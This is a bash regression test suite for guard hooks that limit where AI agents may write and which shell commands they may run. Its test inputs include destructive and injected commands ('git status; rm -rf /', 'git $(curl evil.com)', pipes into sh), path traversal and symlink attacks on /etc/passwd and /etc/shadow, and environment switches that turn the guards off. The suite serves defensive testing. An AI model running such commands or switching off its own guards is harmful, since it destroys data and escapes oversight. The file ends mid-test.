#!/usr/bin/env bash
# Regression suite for hook-pm-write-guard.sh, hook-codex-bash-guard.sh,
# hook-codex-write-guard.sh, and hook-reviewer-write-guard.sh.
# Note: hook-reviewer-write-guard.sh is the policy-backing script for
# `pmctl guard check --role reviewer`; it is NOT a PreToolUse hook.
# Its pmctl integration is covered by test-pmctl-guard.sh.
#
# Runs each hook script with a stdin payload that simulates the PreToolUse JSON
# Claude Code emits, asserts the exit code, optionally checks for a substring in
# stderr, and (on selected cases) asserts a substring in the audit log.
#
# Audit log is redirected to a per-run temp dir via $CLAUDE_HOOK_LOG_DIR — the
# live ~/.claude/logs/hooks.log is NOT polluted by this suite.
#
# Usage:
#   scripts/test-hooks.sh           # silent unless failures
#   VERBOSE=1 scripts/test-hooks.sh # print every case

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
PMHOOK="$SCRIPT_DIR/hook-pm-write-guard.sh"
RWHOOK="$SCRIPT_DIR/hook-reviewer-write-guard.sh"
CXHOOK="$SCRIPT_DIR/hook-codex-bash-guard.sh"
CXWHOOK="$SCRIPT_DIR/hook-codex-write-guard.sh"
TRACE_HOOK="$SCRIPT_DIR/hook-tool-trace.sh"
STOP_HOOK="$SCRIPT_DIR/hook-log-claude-usage.sh"
RL_HOOK="$SCRIPT_DIR/hook-save-rate-limits.sh"
MEM_HOOK="$SCRIPT_DIR/hook-inject-memory.sh"
SESSION_HOOK="$SCRIPT_DIR/hook-session-summary.sh"

# shellcheck source=scripts/lib/test-harness.sh
. "$SCRIPT_DIR/lib/test-harness.sh"
th_init --format=indent-2sp-quiet "$@"

# Sandbox audit logs.
export CLAUDE_HOOK_LOG_DIR="$(mktemp -d)"
TEST_LOG_FILE="$CLAUDE_HOOK_LOG_DIR/hooks.log"
trap 'rm -rf "$CLAUDE_HOOK_LOG_DIR" "${DISPATCH_TEST_BRIEF:-}" "${DISPATCH_TEST_BIN:-}" "${tmp_root:-}"' EXIT

# Pin the codex-executor read roots to known values so path tests are
# deterministic regardless of caller environment.
export CLAUDE_HOOK_CODEX_READ_ROOTS="$HOME/github:/tmp"

# run_case <name> <expected_exit> <hook_path> <json_input> [<expected_stderr_substring>]
run_case() {
  local name="$1" expect_exit="$2" hook="$3" json="$4" expect_stderr="${5:-}"
  should_run "$name" || return 0
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  printf '%s' "$json" | "$hook" 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then pass=0; fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then pass=0; fi

  if [[ "$pass" == "1" ]]; then
    pass "$name"
  else
    local detail
    detail="$(printf '        expected: exit=%s' "$expect_exit")"
    [[ -n "$expect_stderr" ]] && detail+="$(printf ' stderr~="%s"' "$expect_stderr")"
    detail+=$'\n'"$(printf '        actual:   exit=%s' "$actual_exit")"
    [[ -n "$actual_stderr" ]] && detail+="$(printf ' stderr=%q' "${actual_stderr:0:200}")"
    fail "$name" "$detail"
  fi
}

# run_case_env <name> <expected_exit> <env_var=value> <hook_path> <json_input>
run_case_env() {
  local name="$1" expect_exit="$2" envspec="$3" hook="$4" json="$5"
  should_run "$name" || return 0
  local actual_exit
  actual_exit=$(printf '%s' "$json" | env "$envspec" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$hook" >/dev/null 2>&1; echo $?)
  if [[ "$actual_exit" == "$expect_exit" ]]; then
    pass "$name"
  else
    fail "$name" "$(printf '        expected: exit=%s, actual: %s' "$expect_exit" "$actual_exit")"
  fi
}

# run_command_case <name> <expected_exit> <expected_stderr_substring> <cmd> [args...]
run_command_case() {
  local name="$1" expect_exit="$2" expect_stderr="$3"
  should_run "$name" || return 0
  shift 3
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  "$@" >/dev/null 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then pass=0; fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then pass=0; fi

  if [[ "$pass" == "1" ]]; then
    pass "$name"
  else
    local detail
    detail="$(printf '        expected: exit=%s' "$expect_exit")"
    [[ -n "$expect_stderr" ]] && detail+="$(printf ' stderr~="%s"' "$expect_stderr")"
    detail+=$'\n'"$(printf '        actual:   exit=%s' "$actual_exit")"
    [[ -n "$actual_stderr" ]] && detail+="$(printf ' stderr=%q' "${actual_stderr:0:200}")"
    fail "$name" "$detail"
  fi
}

# assert_log <name> <expected_substring>
# Asserts the test log file contains the substring SOMEWHERE in any line.
assert_log() {
  local name="$1" needle="$2"
  should_run "$name" || return 0
  if [[ -f "$TEST_LOG_FILE" ]] && grep -q -F -- "$needle" "$TEST_LOG_FILE"; then
    pass "$name"
  else
    fail "$name" "$(printf '        missing substring: %q' "$needle")"
  fi
}

# truncate_log — used between sub-suites so audit-content assertions are local.
truncate_log() { : > "$TEST_LOG_FILE"; }

make_stop_home() {
  local tmp_home
  tmp_home="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/stop-home.XXXXXX")"
  mkdir -p "$tmp_home/.claude/scripts"
  ln -s "$SCRIPT_DIR/log-usage.sh" "$tmp_home/.claude/scripts/log-usage.sh"
  printf '%s\n' "$tmp_home"
}

mem_path="$HOME/.claude/projects/test-project/memory/foo.md"
code_path="$REPO_ROOT/agents/project-pm.md"

# =============================================================================
# pm-write-guard
# =============================================================================

$LIST || echo "== hook-pm-write-guard =="

run_case "pm: Edit memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Write memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Edit code (outside memory) → deny" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" \
  "outside memory directory"

run_case "pm: Write to /tmp → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/oops.md"}}' \
  "outside memory directory"

run_case "pm: Edit memory/../../etc/passwd → deny (realpath normalizes)" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.claude/projects/test-project/memory/../../../etc/passwd\"}}" \
  "outside memory directory"

run_case "pm: Edit memory-evil/x.md → deny (no prefix collision)" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.claude/projects/test-project/memory-evil/x.md\"}}" \
  "outside memory directory"

run_case "pm: relative file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":"foo.md"}}' \
  "must be absolute"

run_case "pm: empty file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":""}}' \
  "empty"

run_case "pm: missing tool_input → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit"}' \
  "empty"

run_case "pm: malformed JSON → deny" 2 "$PMHOOK" \
  'not json at all' \
  "malformed JSON"

# Type confusion (qa medium): array-typed agent_type → no-op (jq -r returns
# the JSON-encoded string of the array, which won't equal "project-pm").
run_case "pm: agent_type as array → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":[\"project-pm\"],\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: agent_type null → no-op" 0 "$PMHOOK" \
  "{\"agent_type\":null,\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case "pm: critic Edit anywhere → no-op (allow)" 0 "$PMHOOK" \
  '{"agent_type":"critic","tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: codex-executor Write anywhere → no-op" 0 "$PMHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: main thread (no agent_type) → no-op" 0 "$PMHOOK" \
  '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: project-pm Bash → no-op (matcher would not fire it)" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"ls"}}'

run_case "pm: project-pm Read → no-op" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

run_case_env "pm: bypass via CLAUDE_HOOK_PM_GUARD=off" 0 "CLAUDE_HOOK_PM_GUARD=off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=Off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

# Audit-log content assertions for pm-guard.
$LIST || truncate_log
$LIST || printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains allow line" "decision=allow"

$LIST || truncate_log
$LIST || printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" | "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains deny line with reason" "decision=deny"
assert_log "pm: audit log includes target file_path" "$code_path"

$LIST || truncate_log
$LIST || printf '%s' "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}" | env CLAUDE_HOOK_PM_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$PMHOOK" >/dev/null 2>&1
assert_log "pm: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "pm: bypass line records project-pm (not '?')" "agent=project-pm"

# =============================================================================
# codex-write-guard
# =============================================================================

echo
$LIST || echo "== hook-codex-write-guard =="
truncate_log

# --- happy path: Write/Edit to /tmp/brief-*.md ---
run_case "cxw: Write /tmp/brief-task.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.md"}}'

run_case "cxw: Write /tmp/brief-seed-postal-fix.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-seed-postal-fix.md"}}'

run_case "cxw: Edit /tmp/brief-task.md → allow" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Edit","tool_input":{"file_path":"/tmp/brief-task.md"}}'

# --- denied: source tree / home dir ---
run_case "cxw: Write source file → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/backend/seeds/100_demo_content.sql"}}'

run_case "cxw: Edit source file → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Edit","tool_input":{"file_path":"/home/example/github/pm-dispatch/agents/codex-executor.md"}}'

run_case "cxw: Write /tmp/other.md (not brief-prefixed) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/other.md"}}'

run_case "cxw: Write /tmp/brief-task.txt (not .md) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.txt"}}'

run_case "cxw: Write /tmp/brief- (no suffix) → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-"}}'

run_case "cxw: Write /etc/passwd → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}'

# --- traversal: /tmp/brief-../../../etc/passwd.md normalizes outside /tmp ---
run_case "cxw: Write path traversal via brief prefix → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-/../etc/shadow.md"}}'

# --- no-op for other agents ---
run_case "cxw: project-pm Write anywhere → no-op (pm guard handles it)" 0 "$CXWHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "cxw: critic Write anywhere → no-op" 0 "$CXWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

run_case "cxw: main thread (no agent_type) Write → no-op" 0 "$CXWHOOK" \
  '{"tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

run_case "cxw: codex-executor Bash → no-op (matcher would not fire it)" 0 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /tmp"}}'

# --- edge cases ---
run_case "cxw: empty file_path → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":""}}'

run_case "cxw: relative file_path → deny" 2 "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"brief-task.md"}}'

run_case "cxw: malformed JSON → deny" 2 "$CXWHOOK" \
  'not-json'

# --- symlink attack: /tmp/brief-*.md exists as a symlink to a protected path ---
_cxw_symlink_target="$(mktemp)"
_cxw_symlink_brief="$(mktemp -u /tmp/brief-XXXXXX.md)"
ln -s "$_cxw_symlink_target" "$_cxw_symlink_brief"
run_case "cxw: Write to existing symlink /tmp/brief-*.md → deny" 2 "$CXWHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_cxw_symlink_brief\"}}"
rm -f "$_cxw_symlink_brief" "$_cxw_symlink_target"
unset _cxw_symlink_target _cxw_symlink_brief

# --- bypass ---
run_case_env "cxw: bypass via CLAUDE_HOOK_CODEX_WRITE_GUARD=off" 0 "CLAUDE_HOOK_CODEX_WRITE_GUARD=off" "$CXWHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}'

# --- audit-log content assertions ---
$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/brief-task.md"}}' | "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains allow line" "decision=allow"
assert_log "cxw: allow line records agent=codex-executor" "agent=codex-executor"
assert_log "cxw: allow line records tool=Write" "tool=Write"

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}' | "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains deny line" "decision=deny"
assert_log "cxw: deny line records agent=codex-executor" "agent=codex-executor"

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/foo.go"}}' | env CLAUDE_HOOK_CODEX_WRITE_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$CXWHOOK" >/dev/null 2>&1
assert_log "cxw: audit log contains bypass line" "decision=bypass"
assert_log "cxw: bypass line records agent=codex-executor" "agent=codex-executor"

# =============================================================================
# reviewer-write-guard
# =============================================================================

echo
$LIST || echo "== hook-reviewer-write-guard =="
truncate_log

_gate_dir="$(mktemp -d)/repo/.gate-results"
mkdir -p "$_gate_dir"

# --- happy path: Write/Edit to .gate-results/ ---
for _rw_agent in critic qa-tester architecture-reviewer security-reviewer risk-reviewer; do
  run_case "rw: $_rw_agent Write to .gate-results/ → allow" 0 "$RWHOOK" \
    "{\"agent_type\":\"$_rw_agent\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_gate_dir/output.md\"}}"
  run_case "rw: $_rw_agent Edit to .gate-results/ → allow" 0 "$RWHOOK" \
    "{\"agent_type\":\"$_rw_agent\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$_gate_dir/output.md\"}}"
done
unset _rw_agent

# --- denied: source tree / home dir ---
run_case "rw: critic Write source file → deny" 2 "$RWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/main.go"}}'

run_case "rw: qa-tester Edit source file → deny" 2 "$RWHOOK" \
  '{"agent_type":"qa-tester","tool_name":"Edit","tool_input":{"file_path":"/home/example/github/pm-dispatch/scripts/pr-gate.sh"}}'

run_case "rw: security-reviewer Write /tmp/oops.md → deny" 2 "$RWHOOK" \
  '{"agent_type":"security-reviewer","tool_name":"Write","tool_input":{"file_path":"/tmp/oops.md"}}'

run_case "rw: risk-reviewer Write /etc/passwd → deny" 2 "$RWHOOK" \
  '{"agent_type":"risk-reviewer","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}'

# parent not named .gate-results (file directly in repo root) → deny
run_case "rw: critic Write file not inside .gate-results/ → deny" 2 "$RWHOOK" \
  "{\"agent_type\":\"critic\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$(dirname "$_gate_dir")/gate-result.md\"}}"

# path traversal: resolves outside .gate-results → deny
run_case "rw: critic Write path traversal → deny" 2 "$RWHOOK" \
  "{\"agent_type\":\"critic\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_gate_dir/../evil.md\"}}"

# --- synthetic identity (pmctl guard check --role reviewer codex route) ---
run_case "rw: reviewer (pmctl synthetic) Write to .gate-results/ → allow" 0 "$RWHOOK" \
  "{\"agent_type\":\"reviewer\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_gate_dir/pmctl-output.md\"}}"

run_case "rw: reviewer (pmctl synthetic) Write outside .gate-results/ → deny" 2 "$RWHOOK" \
  '{"agent_type":"reviewer","tool_name":"Write","tool_input":{"file_path":"/tmp/evil.md"}}'

# --- no-op for non-reviewer agents ---
run_case "rw: claude-executor Write anywhere → no-op" 0 "$RWHOOK" \
  '{"agent_type":"claude-executor","tool_name":"Write","tool_input":{"file_path":"/home/example/github/ExampleApp/main.go"}}'

run_case "rw: project-pm Write anywhere → no-op (pm guard handles it)" 0 "$RWHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "rw: main thread (no agent_type) Write → no-op" 0 "$RWHOOK" \
  '{"tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}'

run_case "rw: critic Bash → no-op (matcher would not fire it)" 0 "$RWHOOK" \
  '{"agent_type":"critic","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- edge cases ---
run_case "rw: empty file_path → deny" 2 "$RWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":""}}'

run_case "rw: relative file_path → deny" 2 "$RWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":".gate-results/output.md"}}'

run_case "rw: malformed JSON → deny" 2 "$RWHOOK" \
  'not-json'

# --- symlink attack: target in .gate-results/ exists as a symlink to a protected path ---
_rw_symlink_target="$(mktemp)"
_rw_symlink_out="$_gate_dir/symlink-out.md"
ln -s "$_rw_symlink_target" "$_rw_symlink_out"
run_case "rw: Write to existing symlink in .gate-results/ → deny" 2 "$RWHOOK" \
  "{\"agent_type\":\"critic\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_rw_symlink_out\"}}"
rm -f "$_rw_symlink_out" "$_rw_symlink_target"
unset _rw_symlink_target _rw_symlink_out

# --- bypass ---
run_case_env "rw: bypass via CLAUDE_HOOK_REVIEWER_GUARD=off" 0 "CLAUDE_HOOK_REVIEWER_GUARD=off" "$RWHOOK" \
  '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}'

# --- audit-log content assertions ---
$LIST || truncate_log
$LIST || printf '%s' "{\"agent_type\":\"critic\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$_gate_dir/output.md\"}}" | "$RWHOOK" >/dev/null 2>&1
assert_log "rw: audit log contains allow line" "decision=allow"
assert_log "rw: allow line records agent=critic" "agent=critic"
assert_log "rw: allow line records tool=Write" "tool=Write"

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}' | "$RWHOOK" >/dev/null 2>&1
assert_log "rw: audit log contains deny line" "decision=deny"
assert_log "rw: deny line records agent=critic" "agent=critic"

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"critic","tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}' | env CLAUDE_HOOK_REVIEWER_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$RWHOOK" >/dev/null 2>&1
assert_log "rw: audit log contains bypass line" "decision=bypass"
assert_log "rw: bypass line records agent=critic" "agent=critic"

rm -rf "$_gate_dir" "$(dirname "$_gate_dir")"
unset _gate_dir

# =============================================================================
# codex-bash-guard
# =============================================================================

echo
$LIST || echo "== hook-codex-bash-guard =="
truncate_log

dispatch_abs="$SCRIPT_DIR/codex-dispatch.sh"
export CLAUDE_HOOK_DISPATCH_ABS="$dispatch_abs"
_abs_no_home="${dispatch_abs#"$HOME/"}"
dispatch_tilde="~/$_abs_no_home"
unset _abs_no_home
DISPATCH_TEST_BRIEF="$(mktemp /tmp/codex-dispatch-brief.XXXXXX.md)"
DISPATCH_TEST_BIN="$(mktemp -d)"
printf 'Task with quotes "ok", parens (ok), and\nmultiple lines.\n' > "$DISPATCH_TEST_BRIEF"
cat > "$DISPATCH_TEST_BIN/codex" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

last=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --output-last-message)
      last="$2"
      shift 2
      ;;
    *)
      shift
      ;;
  esac
done

brief="$(cat)"
if [[ "$brief" != *'Task with quotes "ok", parens (ok), and'* || "$brief" != *'multiple lines.'* ]]; then
  exit 23
fi
[[ -n "$last" ]] && printf 'fake final\n' > "$last"
exit 0
EOF
chmod +x "$DISPATCH_TEST_BIN/codex"

# --- happy path ---
run_case "cx: dispatch (absolute) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_abs --cd /tmp -- brief\"}}"

run_case "cx: dispatch (tilde) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp -- brief\"}}"

run_case "cx: dispatch_brief_file_allowed → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file /tmp/brief.md --skip-git-check\"}}"

run_case "cx: dispatch --brief-file=/tmp/brief.md → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file=/tmp/brief.md --skip-git-check\"}}"

run_case "cx: dispatch_brief_file_outside_read_root_denied → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file /etc/passwd --skip-git-check\"}}" \
  "outside read roots"

run_case "cx: dispatch --brief-file=/etc/passwd → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp/x --brief-file=/etc/passwd --skip-git-check\"}}" \
  "outside read roots"

run_command_case "dispatch_both_brief_forms_rejected" 2 "mutually exclusive" \
  "$dispatch_abs" --cd /tmp --brief-file "$DISPATCH_TEST_BRIEF" -- brief

run_command_case "dispatch_brief_file_reads_file" 0 "$DISPATCH_TEST_BRIEF (file)" \
  env PATH="$DISPATCH_TEST_BIN:$PATH" "$dispatch_abs" --cd /tmp --brief-file "$DISPATCH_TEST_BRIEF" --timeout 0 --skip-git-check

run_case "cx: git status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git log → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --oneline -5"}}'

run_case "cx: git -C dir status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp status --short"}}'

run_case "cx: git -C dir diff --stat → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp diff --stat"}}'

run_case "cx: cat file under read root → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/trace.jsonl"}}'

run_case "cx: jq parse on read-root file → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -r .type /tmp/trace.jsonl"}}'

run_case "cx: sleep 10 → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sleep 10"}}'

run_case "cx: pwd → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"pwd"}}'

run_case "cx: relative path under codex CWD → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat .agent-trace/latest.jsonl"}}'

# --- security: per-metachar isolated coverage ---
run_case "cx: SOLO ;  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO &  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status & sleep 1"}}' \
  "shell metacharacter"

run_case "cx: SOLO |  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status | sh"}}' \
  "shell metacharacter"

run_case "cx: SOLO \$  → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo $HOME"}}' \
  "shell metacharacter"

run_case "cx: SOLO backtick → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo `whoami`"}}' \
  "shell metacharacter"

run_case "cx: SOLO ( → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo (foo"}}' \
  "shell metacharacter"

run_case "cx: SOLO ) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo foo)"}}' \
  "shell metacharacter"

run_case "cx: SOLO < (input redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat </tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO > (output redir) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status >/tmp/x"}}' \
  "shell metacharacter"

run_case "cx: SOLO { (brace expansion) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo {a,b}"}}' \
  "shell metacharacter"

run_case "cx: SOLO \\\\ (backslash) → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"echo \\foo"}}' \
  "shell metacharacter"

# Newline / CR handled in distinct branches.
run_case "cx: command with newline → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /"}}' \
  "newline"

run_case "cx: command with CR → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\rrm -rf /"}}' \
  "carriage return"

# Composition aliases that combine multiple metachars; each previously demonstrated as bypass.
run_case "cx: git status; rm -rf / → deny (semicolon)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git status && rm -rf / → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status && rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git \$(curl evil) → deny (cmd subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git $(curl evil.com)"}}' \
  "shell metacharacter"

run_case "cx: cat <(...) → deny (process subst)" 2 "$CXHOOK" \
